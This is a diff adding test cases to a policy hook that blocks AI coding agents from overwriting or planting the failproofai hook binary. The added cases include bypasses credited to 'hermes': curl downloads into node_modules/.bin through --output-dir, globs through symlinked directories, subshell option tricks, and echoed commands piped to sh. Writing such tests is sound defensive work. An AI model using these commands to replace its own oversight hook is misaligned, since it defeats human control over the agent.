@@ -1,6 +1,6 @@
 // @vitest-environment node
 import { describe, it, expect, vi, beforeAll, afterAll } from "vitest";
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { BUILTIN_POLICIES } from "../../src/hooks/builtin-policies";
@@ -262,6 +262,10 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
         expect(await bashIn(join(root, "proj", "tools"), command)).toBe("deny");
       });
 
+      it("denies a named output that curl puts into a linked --output-dir", async () => {
+        expect(await bashIn(join(root, "proj"), "curl --output-dir tools/bins -o failproofai https://example.com/x")).toBe("deny");
+      });
+
       it("allows a glued output file that is no link", async () => {
         expect(await bashIn(join(root, "proj", "tools"), "curl -sohook.txt https://example.com/x")).not.toBe("deny");
       });
@@ -310,6 +314,10 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
         "set -o physical; cd tools/deep/.. && printf x > failproofai",
         "cd -P tools/deep && cd .. && printf x > failproofai",
         "cd tools/deep && printf x > ../failproofai",
+        // A subshell's shell options are its own (found by hermes on
+        // FailproofAI/failproofai#1058).
+        "set -P; (set +P); cd tools/deep/.. && printf x > failproofai",
+        "(set -P; cd tools/deep/.. && printf x > failproofai)",
       ])("denies a write after a physical move through a link: %s", async (command) => {
         expect(await bashIn(join(root, "proj"), command)).toBe("deny");
       });
@@ -318,6 +326,8 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
         "cd tools/deep/.. && printf x > failproofai",
         "cd -L tools/deep/.. && printf x > failproofai",
         "set -P; set +P; cd tools/deep/.. && printf x > failproofai",
+        "(set -P); cd tools/deep/.. && printf x > failproofai",
+        "(set -P; cd tools/deep/..); printf x > failproofai",
       ])("still allows a write after a logical move: %s", async (command) => {
         expect(await bashIn(join(root, "proj"), command)).not.toBe("deny");
       });
@@ -350,6 +360,50 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
         // A variable the line never sets is read as an unknown `cd` is.
         'ln -sfn "$RELEASE_DIR" current && cp -r shared/config current/',
       ])("still allows a write through a link made on the line: %s", async (command) => {
+        expect(await bashIn(join(root, "proj"), command)).not.toBe("deny");
+      });
+    });
+
+    // A pattern in a directory component is expanded the way the shell expands
+    // it, against what is on disk, and each path it reaches is followed through
+    // its links: with `bins` a link to `node_modules/.bin` and the entry there,
+    // `b*/failproofai` is the entry (found by hermes on
+    // FailproofAI/failproofai#1058).
+    describe("globs expanded on disk", () => {
+      let root: string;
+
+      beforeAll(() => {
+        root = mkdtempSync(join(tmpdir(), "fpai-npx-glob-"));
+        mkdirSync(join(root, "proj", "node_modules", ".bin"), { recursive: true });
+        mkdirSync(join(root, "proj", "src"));
+        mkdirSync(join(root, "proj", "out"));
+        writeFileSync(join(root, "proj", "node_modules", ".bin", "failproofai"), "#!/bin/sh\n");
+        writeFileSync(join(root, "proj", "package.json"), "{}\n");
+        symlinkSync(join(root, "proj", "node_modules", ".bin"), join(root, "proj", "bins"));
+        symlinkSync(join(root, "proj", "node_modules", ".bin", "failproofai"), join(root, "proj", "hook"));
+      });
+
+      afterAll(() => {
+        rmSync(root, { recursive: true, force: true });
+      });
+
+      it.each([
+        "cp /tmp/stub.sh b*/failproofai",
+        "cp /tmp/stub.sh bi?s/failproofai",
+        "cp /tmp/stub.sh [b]ins/failproofai",
+        "printf x > b*/failproofai",
+        "tee {bins,x}/failproofai < /tmp/stub.sh",
+      ])("denies a glob or brace through a linked directory onto the entry: %s", async (command) => {
+        expect(await bashIn(join(root, "proj"), command)).toBe("deny");
+      });
+
+      it.each([
+        "cat */package.json",
+        "rm -rf */dist",
+        "ls b*/",
+        "cp /tmp/stub.sh s*/notes.txt",
+        "tee {out,src}/notes.txt < /tmp/stub.sh",
+      ])("still allows a glob that reaches no protected path: %s", async (command) => {
         expect(await bashIn(join(root, "proj"), command)).not.toBe("deny");
       });
     });
@@ -652,6 +706,11 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
       // An output file glued to its option, alone or after a cluster.
       ["/work/proj", "curl -sonode_modules/.bin/failproofai https://example.com/x"],
       ["/work/proj", "curl -so~/.failproofai/policies-config.json https://example.com/x"],
+      // A file `-o` names lands in `--output-dir` (found by hermes on
+      // FailproofAI/failproofai#1058).
+      ["/work/proj", "curl --output-dir node_modules/.bin -o failproofai https://example.com/x"],
+      ["/work/proj", "curl --output-dir=node_modules/.bin -sofailproofai https://example.com/x"],
+      ["/work/proj", "curl --output-dir node_modules/.bin --output failproofai https://example.com/x"],
     ])("denies a download or remote copy from %s: %s", async (cwd, command) => {
       expect(await bashIn(cwd, command)).toBe("deny");
     });
@@ -723,6 +782,13 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
       "echo 'cat > node_modules/.bin/failproofai' | cat",
       "printf '%s\\n' 'cat > node_modules/.bin/failproofai' | grep cat | wc -l",
       "(cd src && ls); echo 'cat > node_modules/.bin/failproofai'",
+      // Into a documentation file, when nothing on the line runs a file (found
+      // by hermes on FailproofAI/failproofai#1058).
+      "echo 'cat > node_modules/.bin/failproofai' >> docs/notes.md",
+      "printf '%s\\n' '> node_modules/.bin/failproofai' > docs/recipe.md",
+      "echo 'cat > node_modules/.bin/failproofai' | tee -a docs/notes.md",
+      "echo 'printf x > node_modules/.bin/failproofai' | tee /tmp/s.sh",
+      "echo 'printf x > node_modules/.bin/failproofai' | cat > /tmp/s.sh",
       "echo 'cat > node_modules/.bin/failproofai'; echo done",
     ])("allows printing a command as text: %s", async (command) => {
       expect(await bash(command)).toBe("allow");
@@ -744,8 +810,10 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
       // `echo` the line redefines, the shell's own output sent to one, and a
       // substitution, which runs.
       "echo 'printf x > node_modules/.bin/failproofai' | grep x | sh",
-      "echo 'printf x > node_modules/.bin/failproofai' | tee /tmp/s.sh",
-      "echo 'printf x > node_modules/.bin/failproofai' | cat > /tmp/s.sh",
+      // A file printed into, then run on the same line.
+      "echo 'printf x > node_modules/.bin/failproofai' > docs/s.sh && sh docs/s.sh",
+      "echo 'printf x > node_modules/.bin/failproofai' > s.sh; ./s.sh",
+      "echo 'printf x > node_modules/.bin/failproofai' | tee s.sh | sh",
       "for i in 1; do\necho 'printf x > node_modules/.bin/failproofai'\ndone | sh",
       "if true; then\necho 'printf x > node_modules/.bin/failproofai'\nfi | sh",
       'echo() { sh -c "$*"; }; echo \'printf x > node_modules/.bin/failproofai\'',
@@ -778,6 +846,10 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
       "gcc -o failproofai main.c",
       "dd if=/tmp/stub.sh of=failproofai",
       "printf x > failproofai/dist/cli.mjs",
+      // Through a directory that may be a link where the command really runs.
+      "printf x > tbins/failproofai",
+      "printf x > x/y/failproofai.cmd",
+      "cp /tmp/stub.sh deps/failproofai/dist/cli.mjs",
     ])("denies a Codex command planting the entry wherever it runs: %s", async (command) => {
       expect(await bashAs("codex", { command })).toBe("deny");
     });
@@ -790,6 +862,8 @@ describe("block-failproofai-commands — the entry a project-scope npx hook runs
       "cat failproofai",
       "printf x > src/failproofai.ts",
       "cd /tmp && printf x > failproofai",
+      "printf x > tbins/notes.txt",
+      "printf x > docs/intro.md",
     ])("allows a Codex command that plants nothing: %s", async (command) => {
       expect(await bashAs("codex", { command })).toBe("allow");
     });
